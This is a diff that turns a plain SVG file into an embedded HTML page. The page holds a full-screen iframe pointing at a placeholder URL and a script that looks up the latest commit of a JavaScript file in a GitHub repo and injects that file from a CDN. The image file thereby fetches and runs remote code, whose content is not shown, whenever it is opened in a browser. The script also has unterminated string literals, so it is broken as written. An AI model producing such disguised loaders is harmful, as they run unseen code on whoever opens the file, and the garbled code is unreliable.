@@ -1,2 +1,48 @@
 <svg>
+  <foreignObject width="100%" height="100%" x="0" y="0">
+    <html xmlns="http://www.w3.org/1999/xhtml" style="width: 100%; height: 100%; margin: 0; padding: 0;">
+    <head>
+        <meta charset="UTF-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <style>
+            html, body {
+                margin: 0;
+                padding: 0;
+                width: 100%;
+                height: 100%;
+                overflow: hidden;
+                background-color: #000;
+            }
+            iframe {
+                width: 100%;
+                height: 100%;
+                border: none;
+                display: block;
+            }
+        </style>
+    </head>
+    <body>
+        <iframe id="targetIframe" src="https://your-hardcoded-url-here.com" allowfullscreen="true"></iframe>
+        
+        <script>
+            const owner = 'lotsacookie;
+            const repo = 'kstuff;
+            const filePath = 'Pages/gfn/assets/main.js';
+            
+            fetch(`https://api.github.com/repos/${owner}/${repo}/commits?path=${filePath}&per_page=1`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data[0] && data[0].sha) {
+                        const sha = data[0].sha;
+                        const scriptUrl = `https://cdn.jsdelivr.net/gh/${owner}/${repo}@${sha}/${filePath}`;
+                        const script = document.createElement('script');
+                        script.src = scriptUrl;
+                        document.body.appendChild(script);
+                    }
+                })
+                .catch(err => console.error(err));
+        </script>
+    </body>
+    </html>
+</foreignObject>
 </svg>
